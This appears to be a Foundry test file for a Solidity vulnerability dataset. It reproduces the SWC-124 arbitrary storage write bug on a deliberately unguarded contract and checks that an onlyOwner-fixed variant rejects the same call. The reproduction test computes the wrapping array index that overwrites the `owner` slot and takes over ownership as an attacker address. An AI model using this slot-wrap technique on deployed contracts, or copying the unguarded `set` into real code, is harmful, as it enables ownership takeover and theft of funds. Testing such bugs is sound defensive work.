// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {MappingWrite} from "../src/MappingWrite.sol";
import {MappingWriteFixed} from "../src/MappingWriteFixed.sol";

// Differential fixture for the SWC-124 mapping-write bug.
// The vulnerable `set` has no access control, so any caller can write an
// arbitrary storage slot through the dynamically-sized `map` array. The fixed
// variant gates `set` behind `onlyOwner`.
contract MappingWriteFixtureTest is Test {
    address internal attacker;

    function setUp() public {
        attacker = makeAddr("attacker");
    }

    // `map` is a dynamic array stored in slot 1, so its element `i` lives at
    // keccak256(abi.encode(uint256(1))) + i. Choosing
    // i = 2**256 - keccak256(1) wraps the write onto slot 0, which is `owner`.
    function _ownerSlotIndex() internal pure returns (uint256) {
        uint256 base = uint256(keccak256(abi.encode(uint256(1))));
        return type(uint256).max - base + 1; // == 2**256 - base
    }

    function test_fixtureReproduces() public {
        MappingWrite m = new MappingWrite();
        // The dataset contract never assigns `owner`, so it starts at zero.
        assertEq(m.owner(), address(0), "owner unset at deployment");

        uint256 value = uint256(uint160(attacker));

        vm.prank(attacker);
        m.set(_ownerSlotIndex(), value);

        assertEq(m.owner(), attacker, "owner overwritten by unguarded mapping write");
    }

    function test_fixtureDoesNotReproduce() public {
        MappingWriteFixed m = new MappingWriteFixed();
        address before = m.owner();
        assertEq(before, address(this), "fixed owner is the deployer");

        uint256 value = uint256(uint160(attacker));

        vm.prank(attacker);
        vm.expectRevert();
        m.set(_ownerSlotIndex(), value);

        assertEq(m.owner(), before, "owner unchanged: set is onlyOwner");
    }
}
